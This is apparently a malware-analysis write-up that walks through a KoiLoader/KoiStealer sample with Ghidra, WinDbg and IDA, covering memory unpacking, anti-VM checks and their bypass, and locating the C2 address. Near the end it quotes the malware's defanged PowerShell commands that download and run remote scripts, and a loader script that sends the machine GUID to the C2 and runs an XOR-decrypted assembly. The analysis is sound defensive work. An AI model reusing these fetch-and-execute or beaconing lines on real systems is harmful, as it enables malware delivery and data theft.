---
tags: CTF
---
## Analysing a KoiLoader / KoiStealer sample with WinDbg

The main focus of this post is to use WinDbg for binary analysis rather than focusing too much on the specific functionality of this malware. I have skipped over the first few steps of the execution chain which are JavaScript, PowerShell & Shellcode loaders, which result in the execution of the following binary:

File Name: ciconinejvR.exe

SHA 256: 74b85c502651bae1734849f3ac49d8152a6c0fbb9234083b1384d8cbe3640068

## Initial static analysis with Ghidra

Dropping the executable into a disassembler like Ghidra allows us to review any interesting strings or imports to begin our analysis.
Imports from KERNEL32.dll are noted such as VirtualAlloc and VirtualProtect, which indicate that the binary is going to allocate a space in memory, write to it, and change the permissions preparing for execution.

<img width="350" alt="image" src="https://github.com/user-attachments/assets/c8ae14b9-9581-4e99-9c26-c83e821c9699" />

These imports can be found in Ghidra by viewing the Symbol Tree, an option for which is present on the toolbar at the top of the program. We can then highlight and double click an import to see where it is referenced in the executable.

<img width="1600" alt="image" src="https://github.com/user-attachments/assets/19de60ff-7680-4317-bd0d-fde71fd68654" />

When we navigate to our import of interest, in this case VirtualAlloc, we can review the cross references (XREF) to see how many times VirtualAlloc is called, and in what functions.

<img width="1250" alt="image" src="https://github.com/user-attachments/assets/ddac117e-4ba5-4b0a-a2e2-2056cf298c3b" />

It appears that VirtualAlloc is only present in one function - FUN_00401300. We can click this value to navigate to this function and review it in the decompile window on the left.
We can see on line 37 that VirtualAlloc is called with multiple arguments, and the result of which is stored as _Dst.

<img width="800" alt="image" src="https://github.com/user-attachments/assets/ea55e824-6d2c-4864-98f9-9a53254b6f92" />

We can gather context on what these arguments may be by reviewing Microsoft Documentation for VirtualAlloc

On line 78 we can see that VirtualProtect is being called with _Dst being passed to it as the first argument.

<img width="900" alt="image" src="https://github.com/user-attachments/assets/d2c5c39a-57f0-46b8-b689-2e6fb9d4e341" />

VirtualProtect changes the protection on a region of committed pages in the virtual address space. The first argument that gets passed to it is the address of the starting page of the region of pages whose access protection attributes are to be changed.
_Dst is our area of interest, as it appears very likely that some form of executable code has been written to this address space.
We'll now move over to a debugger to attempt to locate and interrogate this area of memory.

## Debugging ciconinejvR.exe with WinDbg

After loading the executable with WinDbg we use the command "bp $exentry" to set a breakpoint at the entrypoint and "g" to go there.
Now we're going to set a breakpoint at VirtualProtect by using the command "bp VirtualProtect" and "g" to go there.

<img width="900" alt="image" src="https://github.com/user-attachments/assets/61bf8bbc-7ba9-4d41-a678-c68aaddc7c0b" />

We're now at the VirtualProtect API call.
We can review the first argument being passed to VirtualProtect (lpAddress) by querying the EAX register.

<img width="900" alt="image" src="https://github.com/user-attachments/assets/c06de256-60e7-48f9-9f69-0ea70a70f6a2" />

In my case, EAX is pointing to 03030000. We navigate to this address in memory by using the Memory view. 

<img width="900" alt="image" src="https://github.com/user-attachments/assets/1abed962-4baa-4e1e-a732-2073e5aab48c" />

The screenshot above shows the portable executable (PE) file format present at that address in memory. This indicates that a second-stage binary has been unpacked and is going to be executed by our initial binary.
We can dump this memory by using the .writemem command, which requires the arguments FilePath, Base Address, End Address. In my case this is going to be ".writemem C:\Users\User\Desktop\dump.dmp 03030000 0303D000".

## Investigating our new unpacked binary with IDA

Moving on to the binary we've just unpacked (HASH: d950f0e4a597416aa8f4cb0682d29707cc8958b2972ab307b9f34316e806ec4d)
As this binary was pulled from memory, we need to use a tool like pe_unmapper to realign the PE from virtual to raw addresses.

<img width="900" alt="image" src="https://github.com/user-attachments/assets/7562d70e-5977-43ed-8408-ff50e28930da" />

Now I'll load the binary into IDA, look at some interesting strings and take it from there.
Strings can be viewed in IDA by navigating to View > Open subviews > Strings

<img width="900" alt="image" src="https://github.com/user-attachments/assets/ebe3460f-c607-4082-925a-d8f654a48c94" />

The string that caught my eye here was "Jennifer Lopez & Pitbull - On The Floor\r\nBeyonce - Halo"

<img width="900" alt="image" src="https://github.com/user-attachments/assets/7df464a5-1661-44fe-ab59-bb93135b7a3e" />

Similar to Ghidra, we can double click this value and follow the XREF function to see where this string appears in a function. 
Reviewing the rest of this function it appears that values taken from the host are being compared to strings, and if a value is a match, the program will exit. (This function exists at raw address 0x408A00)
This whole function is an anti-analysis / anti-VM/Sandbox check. The program is going to compare known values to be associated with a VM / Sandbox to the values on this host by enumerating it, and if the values match, the program is going to jump to a location that terminates the program.

Towards the top of the function we can see the following instructions: (0x00408A12)

<img width="900" alt="image" src="https://github.com/user-attachments/assets/9c53f4df-c6f4-48fc-a68b-372f41341ea5" />

## Breaking it down: anti-analysis checks

Initially we can see that EnumDisplayDevicesW is called, this is a Windows API that is going to enumerate display devices on the host.

```
mov     [ebp+DisplayDevice.cb], 348h
push    esi             ; dwFlags
push    eax             ; lpDisplayDevice
push    esi             ; iDevNum
push    esi             ; lpDevice
call    edi ; EnumDisplayDevicesW
```

The code then pushes the string "Hypver-V" and the device string "DisplayDevice.DeviceString" onto the stack:
```
push    offset aHyperV  ; "Hyper-V"
lea     eax, [ebp+DisplayDevice.DeviceString]
StrStrIW is then called, which is a function that is going to search for / compare the two strings:
call    ebx ; StrStrIW
```

The result of this function is stored in the EAX register.
If StrStrIW finds the substring "Hyper-V", EAX will hold a non-zero pointer to the location of the substring.
If StrStrIW does not find the substring, EAX will be 0.


Next, the code performs a bitwise AND operation between EAX and itself.
```
test    eax, eax
```
If EAX is non-zero (if the substring was found) then the Zero Flag (ZF) will be cleared (ZF=0).
If EAX is zero (if the substring was not found) then the Zero Flag will be set (ZF=1).


Next, the zero flag is checked. If ZF=0 (Hyper-V was found) then the program will jump to 0x408B55, otherwise, the jnz instruction will not jump and the program will continue to execute the next instruction.
```
jnz     loc_408B55
```

## Debugging our new unpacked binary with WinDbg

Now that I know this executable performs various anti-analysis checks, I want to investigate this further and think about how to overcome this.
Loading the binary into WinDbg I want to set a breakpoint at where the program checks for the "Parallels Display Adapter" string, as this is what my VM is running on and this is likely to result in the application exiting.
Due to ASLR, we need to re-allign our debugger and our disassembler to the same base address. We can review our entry point address in WinDbg by reviewing this address when we load the executable:

<img width="1250" alt="image" src="https://github.com/user-attachments/assets/317e2a0c-0cb1-48cf-9a79-16f895c1ac4a" />

My base address is 00990000, which i need to tell IDA, this is done by going to Edit > Segments > Rebase Program

<img width="900" alt="image" src="https://github.com/user-attachments/assets/d25e6f52-ab03-44e5-81ed-32b81fbdecca" />

With our addresses re-aligned, I want to set a breakpoint to the Parallels virtualisation check, which is going to be at around 0x00998A7D 

<img width="900" alt="image" src="https://github.com/user-attachments/assets/bcd94521-096b-474e-9023-efc930ea9ffd" />

Stepping through the program, I can see that the following instruction pushes my Display Adapter to the EAX register, which is visible by reviewing the address at the EAX register

<img width="900" alt="image" src="https://github.com/user-attachments/assets/2f19d943-0259-4465-8711-634944494fff" />

<img width="350" alt="image" src="https://github.com/user-attachments/assets/dae58b60-5421-4848-bc9b-12d8cf681667" />

<img width="900" alt="image" src="https://github.com/user-attachments/assets/a23bba20-e433-45f4-8d85-a0ceab657dbb" />

After passing the "test    eax, eax" instruction, my Zero Flag is changed to 0 (Visible in the Registers View)

<img width="550" alt="image" src="https://github.com/user-attachments/assets/2dec2267-1dbb-4192-8e2a-e00c4cf202c0" />

This means I'm going to qualify for the jnz instruction and jump to address 0x00998b55:

<img width="600" alt="image" src="https://github.com/user-attachments/assets/08a3ef98-88c7-4f97-83ec-9626f495d929" />

This jumps me to the end of the function and returns me to the previous function.

<img width="650" alt="image" src="https://github.com/user-attachments/assets/7cdefd5f-bb67-4fd2-bdac-78f767e9271b" />

When I'm returned, a test al, al instruction is performed. 'al' refers to the lower 8 bits of the EAX register. This is likely another anti-analysis check which is going to fail because I did not complete the previous function, and the process will terminate.
I can confirm this by jumping to that address in IDA and reviewing the execution flow. This is done by pressing "g" to go to a specific address, in my case it's 0x009992ea.

<img width="800" alt="image" src="https://github.com/user-attachments/assets/76482023-d733-4707-b813-f19b9c1ddb87" />

If the test al,al instruction "fails" (ZF=0), it will call ExitProcess.
Otherwise, if it's happy (ZF=1) it looks like we proceed to the main functions of the program.
This means that we only need to satisfy this one check to be able to execute the program.

## Overcoming anti-VM checks

We can manually change the zero-flag prior to a jnz instruction.
By using the command "r@zf=1", I change my zero flag from 0 to 1. Now when I step over the jnz instruction, it does not jump me.

<img width="900" alt="image" src="https://github.com/user-attachments/assets/357b6d6d-b7a8-4423-8d46-ede979555665" />

I can now continue execution of this program and review the further function calls

<img width="700" alt="image" src="https://github.com/user-attachments/assets/53d99242-a9d9-4182-8c79-577ed02d70f1" />

## Identifying C2 Address

Now that we've overcome the anti-VM checks we can continue to investigate this binary. My goal is to identify a C2 address that the malware calls out to.
Reviewing Imports, there are some loaded from the WININET library of interest:

<img width="900" alt="image" src="https://github.com/user-attachments/assets/f00e3ad9-e581-4e84-b4e6-8e3af502b9da" />

Again ,we double click on the API of interest and follow the XREF to see the references in a function.

<img width="750" alt="image" src="https://github.com/user-attachments/assets/67e0c546-850c-468d-a9b4-db1cb7a1d2ad" />

Reviewing the documentation for InternetConnectW and reviewing the code above, we know that the second argument being passed to the API is our remote address. The value of which appears to be pushed to the EBP register.
We'll set our breakpoint at the API in a debugger to review this further.

<img width="900" alt="image" src="https://github.com/user-attachments/assets/6dd2df7a-db57-4dc4-83c9-355b7a7bf82e" />

I'm now at the API call, reviewing the disassembly, I can see that the address for our remote address used for the InternetConnectW API call has been pushed to ebp-2C.
To calculate this value, I need to subtract 2C from our current EBP register address.

<img width="250" alt="image" src="https://github.com/user-attachments/assets/520af37b-e6a7-415a-ad9b-c024ba475857" />

026FFA90 - 2C = 26FFA64.

<img width="900" alt="image" src="https://github.com/user-attachments/assets/8907f70c-25d0-4945-b07e-41744618e4ba" />

Reviewing that address in the memory view doesn't reveal anything that resembles a C2 address, so it's instead likely that a pointer has been used.

## Dereferencing a pointer

We need to "dereference" this pointer to ascertain the memory address from which is being supplied to the API call.
This is simply done by using the following command: "dd 26FFA64 L1"

<img width="450" alt="image" src="https://github.com/user-attachments/assets/eb8ebc0c-43ba-4718-8488-23a398ff5764" />

This returns the address 0723e398, navigating to this address in memory gives us the C2 IP: 87.121.61[.]55

<img width="900" alt="image" src="https://github.com/user-attachments/assets/0e7362d3-7258-4595-a09d-060f025a6041" />

## KoiStealer Assembly

That was the WinDbg element of this post covered, but the main payload to KoiStealer is the followig assmelby which gets downloaded and execution from this function:

<img width="1300" alt="image" src="https://github.com/user-attachments/assets/dcb97fd7-c99c-40e7-ae97-2632a13caa6d" />

The routine determines which payload to retrieve based on the presence of the C# compiler (csc.exe, version v4.0.30319). If the compiler is found, it downloads sd4.ps1; otherwise, it downloads sd2.ps1. Both PowerShell scripts are designed to fetch and execute the KoiStealer malware.

The corresponding PowerShell commands are:

```
powershell.exe -command IEX(IWR -UseBasicParsing "hxxps[://]casettalecese[.]it/wp-content/uploads/2022/10/sd4.ps1")
powershell.exe -command IEX(IWR -UseBasicParsing "hxxps[://]casettalecese[.]it/wp-content/uploads/2022/10/sd2.ps1")
```

One of these PowerShell scripts looks like the following:


```
[byte[]] $bindata = (Long Hex Array)

# [Net.ServicePointManager]::SecurityProtocol +='tls12'
$guid = (Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid
$cfb = (new-object net.webclient).downloadstring("hxxp[://]87.121.61[.]55/index.php?id=$guid&subid=FJvijm8h").Split('|')
$k = $cfb[0];

for ($i = 0; $i -lt $bindata.Length ; ++$i)
{
	$bindata[$i] = $bindata[$i] -bxor $k[$i % $k.Length]
}

$sm = [System.Reflection.Assembly]::Load($bindata)
$ep = $sm.EntryPoint


$ep.Invoke($null, (, [string[]] ($cfb[1], $cfb[2], $cfb[3])))

```

The script retrieves the victim machine’s unique GUID from the Windows registry, contacts the C2 and sends the GUID along with a SubID, The server responds with data split by | — the first element is an XOR key, and the next elements are additional strings.

The C2 server is no longer alive but the contents can be retrieved from VirusTotal:

<img width="694" alt="image" src="https://github.com/user-attachments/assets/30f3209c-e827-4159-83bf-8b5317329c17" />

We now have the XOR key "LenKQVy4Bh10vp2vt9AE" and can decrypt the assmebly.

<img width="1213" alt="image" src="https://github.com/user-attachments/assets/80a090b0-0a0d-4ec7-8983-d51cfebbb967" />




























